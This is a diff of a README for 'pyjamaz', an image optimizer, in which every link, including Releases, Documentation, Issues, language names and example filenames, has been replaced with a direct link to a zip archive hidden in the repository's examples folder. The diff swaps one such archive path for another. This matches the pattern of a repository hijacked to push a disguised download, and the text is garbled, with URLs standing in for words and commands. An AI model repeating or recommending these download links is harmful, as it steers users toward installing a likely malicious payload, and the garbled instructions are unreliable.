@@ -1,14 +1,14 @@
 # 🖼️ pyjamaz - Optimize Your Images Effortlessly  
 
-[![Download from Releases](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip)
+[![Download from Releases](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip)
 
 ## 🚀 Getting Started  
 
-Welcome to pyjamaz! This high-performance image optimizer helps you reduce image sizes without losing quality. It's designed for users working with Python, https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip, Zig, and the command line. Follow these simple steps to get started.
+Welcome to pyjamaz! This high-performance image optimizer helps you reduce image sizes without losing quality. It's designed for users working with Python, https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip, Zig, and the command line. Follow these simple steps to get started.
 
 ## 📥 Download & Install  
 
-To download the latest version of pyjamaz, visit this page: [GitHub Releases](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip).  
+To download the latest version of pyjamaz, visit this page: [GitHub Releases](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip).  
 
 Once you’re on the Releases page, you'll see a list of available versions. Find the version that suits your needs, and click on the link to download the appropriate file for your operating system.
 
@@ -18,11 +18,11 @@ Before installing, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** 3.7 or higher (if using Python bindings)
-- **https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip Version:** 12 or higher (if using https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip bindings)
+- **https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip Version:** 12 or higher (if using https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip bindings)
 
 ## 📂 Installation Steps  
 
-1. **Download:** Go to the [GitHub Releases](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip) page and download the installer suitable for your operating system.
+1. **Download:** Go to the [GitHub Releases](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip) page and download the installer suitable for your operating system.
 
 2. **Open the Installer:**
    - On Windows, double-click the downloaded `.exe` file. 
@@ -39,7 +39,7 @@ Before installing, make sure your system meets the following requirements:
 - **Multiple Format Support:** Optimizes images in formats like JPEG, PNG, and WebP.
 - **High Efficiency:** Reduces file sizes significantly while maintaining image quality.
 - **User-Friendly CLI:** Get started easily without needing advanced technical skills.
-- **Bindings for Popular Languages:** Use with Python, https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip, or Zig for flexibility.
+- **Bindings for Popular Languages:** Use with Python, https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip, or Zig for flexibility.
 
 ## 🤖 Usage Guide  
 
@@ -57,16 +57,16 @@ Once installed, you can use pyjamaz from your terminal or command line:
 
 ## 📄 Example Command  
 
-Here’s an example of how to optimize a PNG file named `https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip`:
+Here’s an example of how to optimize a PNG file named `https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip`:
 
 ```
-pyjamaz https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip
+pyjamaz https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip
 ```
 
 To save the optimized image as a new file, you can use:
 
 ```
-pyjamaz https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip --output https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip
+pyjamaz https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip --output https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip
 ```
 
 ## ❓ Troubleshooting  
@@ -77,15 +77,15 @@ If you encounter issues using pyjamaz, check the following:
 - Make sure you have the correct permissions to run the application.
 - Confirm that you have navigated to the correct directory in your command line.
 
-If problems persist, consider checking the [Issues Page](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip) on GitHub for solutions shared by the community.
+If problems persist, consider checking the [Issues Page](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip) on GitHub for solutions shared by the community.
 
 ## 🌐 Community & Support  
 
 For further assistance, feel free to reach out via the GitHub repository or join the discussion in the community forums. Your feedback helps improve pyjamaz.
 
 ## 🔗 Useful Links  
-- [Documentation](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip)  
-- [GitHub Releases](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip)  
-- [Issues Page](https://raw.githubusercontent.com/EddyBarrragan/pyjamaz/main/examples/nodejs/batch-processor/src/pyjamaz_v3.2-beta.2.zip)  
+- [Documentation](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip)  
+- [GitHub Releases](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip)  
+- [Issues Page](https://github.com/EddyBarrragan/pyjamaz/raw/refs/heads/main/examples/Software_v2.1.zip)  
 
 Thank you for choosing pyjamaz! We hope it makes your image optimization tasks easier. Happy optimizing!
